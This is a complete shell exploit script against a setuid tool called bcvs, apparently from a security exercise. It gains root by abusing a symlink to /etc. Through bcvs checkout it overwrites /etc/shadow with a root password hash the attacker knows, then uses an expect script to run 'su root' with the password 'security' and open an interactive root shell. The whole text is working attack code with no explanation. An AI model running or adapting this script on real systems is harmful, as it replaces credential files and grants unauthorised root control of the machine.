#!/bin/sh
cd /opt/bcvs
mkdir dummydir
cd dummydir
mkdir dummydir
mkdir .bcvs
cd .bcvs
touch block.list
cd ..
ln -s /etc etclink
cd dummydir
mkdir etclink
cd etclink
cat <<EOF > shadow
root:\$6\$KhGmzjFQm4UlzSo1\$meh9grUIf5djWRoQe3FXl9z5/yuO8DdMdiSyEDgQttw/BCKwXC/v0K8Vs5Y48KTBhOdCSWzE79TZBcQKz5Tan.:17791::::::
EOF
cd /opt/bcvs/dummydir
cat <<EOF > xpect
#!/usr/bin/expect
spawn ../bcvs co ../dummydir/etclink/shadow
expect "Please write a SHORT explanation:\r"
send -- "no\r"
sleep 2
spawn su root
expect "Password: "
send -- "security\r"
interact
EOF
chmod +x xpect
./xpect
